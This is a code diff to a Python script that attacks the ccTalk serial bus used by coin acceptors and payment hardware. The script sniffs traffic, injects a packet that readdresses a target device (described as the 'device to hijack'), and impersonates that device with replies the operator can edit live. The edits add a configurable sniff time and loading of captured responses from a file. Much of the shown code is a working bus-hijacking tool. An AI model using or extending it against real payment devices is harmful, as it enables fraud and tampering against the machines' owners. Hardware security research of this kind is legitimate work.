@@ -62,21 +62,17 @@ class ccResponder(threading.Thread):
             resp = ccTalkMessage(header=0, source=self.address, destination=request.source, payload=self.responses[request.payload.header])
         else:
             resp = ccTalkMessage(header=0, source=self.address, destination=request.source)
-        #ser.write(resp.raw())
-        #ser.flush()
-        #ser.read(len(resp.raw()))
         for byte in resp.raw():
             ser.write(byte)
             ser.flush()
             ser.read(1)
 
-    
     def run(self):
         global ser
         while not self.terminated:
             pkt = self.readPacket()
+            # The packet is for the responder
             if pkt.destination==self.address:
-                # The packet is for the responder
                 # Wait 10ms to simulate the device
                 time.sleep(0.01)
                 self.respond(pkt)
@@ -106,7 +102,6 @@ class serialTimerReader(threading.Thread):
             while ser.inWaiting() == 0 and not self.terminated:
                 time.sleep(0.001)
             elapsed = round(time.clock()-start,3)
-            # We need at least a 10 miliseconds time frame to start sending
             # We'll take at least 20 miliseconds to wait and send our data 
             if elapsed >= 0.02:
                 self.times.append(elapsed)
@@ -142,6 +137,7 @@ def enterBitBang():
     #Peripherals : power ON / pullup ON
     ser.write(chr(0b01001100))
     ser.read(1)
+    #Start UART bridge
     ser.write(chr(0b00001111))
     ser.read(1)
 
@@ -161,7 +157,6 @@ def injectMessage(header, data='', source=1, destination=2):
     Waits for a silence on the ccTalk bus, then sends a packet"
     """
     request = ccTalkMessage(source=source, destination=destination, header=header, payload=data)
-    #request.setPayload(header, data)
     bytesToRead=0
     sent=False
     while not sent:
@@ -177,20 +172,15 @@ def injectMessage(header, data='', source=1, destination=2):
         bytesToRead=0
     print "[*] Request sent"
 
-def extractResponses(messages):
-    responses = {}
-    for i in range(0,len(messages)):
-        if messages[i].payload.header==0:
-            responses.update({messages[i-1].payload.header, messages[i].payload.data})
-
 if __name__ == '__main__':
 
     parser = OptionParser()
     parser.add_option("-i", "--interface", help="Serial port to use", metavar="DEVICE", dest="serPort")
-    parser.add_option("-w", "--write", help="File name to write data", metavar="FILE", dest="outFile")
     parser.add_option("-b", "--bus-pirate", help="Use this switch to tell the serial port is a bus pirate", dest="busPirate", action="store_true", default=False)
-    parser.add_option("-s", "--source", help="Source address of the device to hijack", metavar="SOURCE", dest="source", default=2)
-    parser.add_option("-d", "--destination", help="Destination address of the device to hijack", metavar="DESTINATION", dest="destination", default=42)
+    parser.add_option("-s", "--source", type="int", help="Source address of the device to hijack", metavar="SOURCE", dest="source", default=2)
+    parser.add_option("-d", "--destination", type="int", help="Destination address of the device to hijack", metavar="DESTINATION", dest="destination", default=42)
+    parser.add_option("-t", "--time", help="Time to listen for packets", type="int", metavar="TIME", dest="sniffTime", default=5)
+    parser.add_option("-r", "--read", help="File to read responses from", metavar="FILE", dest="inputFile")
 
     (options, args) = parser.parse_args()
 
@@ -210,17 +200,12 @@ if __name__ == '__main__':
             print e.message
             sys.exit()
 
-    if options.outFile is not None:
-        outFile = open(options.outFile,"wb")
-    else:
-        outFile = None
-
     # main loop
     reader = serialTimerReader()
     reader.start()
-    print "[*] Serial timer reader running for 5 seconds..."
+    print "[*] Serial timer reader running for ",options.sniffTime, " seconds..."
 
-    time.sleep(5)
+    time.sleep(options.sniffTime)
     print "[*] Stopping timer reader..."
 
     reader.stop()
@@ -237,12 +222,24 @@ if __name__ == '__main__':
             # We instanciate the responder to load the responses
             responder = ccResponder(int(options.source))
 
-            ccPkts = parseMessages(reader.getData())[1]
+            ccPkts=[]
+
+            # If input file is provided, read responses from there
+            if options.inputFile is not None:
+                try:
+                    fd = open(options.inputFile, "rb")
+                    data = fd.read()
+                    fd.close()
+                    ccPkts += parseMessages(data)[1]
+                except:
+                    print "[!] Data file error"
+
+            # Read responses from the initial sniff
+            ccPkts += parseMessages(reader.getData())[1]
 
             for i in range(len(ccPkts)):
                 if ccPkts[i].payload.header==0:
                     responder.setResponse(ccPkts[i-1].payload.header, ccPkts[i].getPayload()[1:])
-                    print "Added response to request header " + str(ccPkts[i-1].payload.header)
             
             print "[*] Replacing device @ "+str(options.source)+" to "+str(options.destination)
 
@@ -265,7 +262,6 @@ if __name__ == '__main__':
             responder.start()
 
             while True:
-                #time.sleep(1)
                 print 'Enter header value to change (q to quit, l to list current values): '
                 userHeader = raw_input("Value : ")
                 if userHeader == 'l':
@@ -275,6 +271,9 @@ if __name__ == '__main__':
                     userData = raw_input('Enter new data (in hex): ').decode('hex')
                     responder.setResponse(int(userHeader),userData)
                 elif userHeader == 'q':
+                    print "[*] Stopping responder thread"
+                    responder.stop()
+                    responder.join()
                     break
 
         else:
@@ -287,11 +286,8 @@ if __name__ == '__main__':
     except:
        print "" 
 
-    print "[*] Stopping responder thread"
-    responder.stop()
-    responder.join()
 
-    print "[*] Restoring device @ " + str(options.source)
+    print "[*] Restoring device @ " + str(options.destination) + " to " + str(options.source)
     injectMessage( header=251, data=chr(int(options.source)), source=1, destination=int(options.destination))
 
     if options.busPirate:
